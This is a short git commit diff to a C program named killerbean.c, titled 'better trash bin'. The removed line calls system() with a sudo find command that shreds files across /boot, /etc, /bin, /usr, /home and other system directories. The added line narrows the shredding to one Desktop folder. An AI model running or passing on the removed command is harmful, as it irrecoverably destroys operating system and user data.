13b89ac351693cabe186ef641195704c5310fd50
peach <ginahenstock7@gmail.com>
2021-11-30 16:09:26 +0000

    better trash bin

--- killerbean.c
+++ killerbean.c
@@ -6,7 +6,7 @@
 int main () {
    char command[200];
 
-   strcpy(command, "sudo find /boot /etc /tmp /bin /sbin /usr /home -exec shred {} -uvz \\;" );//deletes specific files to avoid the blackhole of dev/zero
+   strcpy(command, "sudo find /home/username/Desktop/shred -exec shred {} -uvz \\;" );//safely deletes in a directory called shred
    //printf(command);//debugging
    system(command);
 
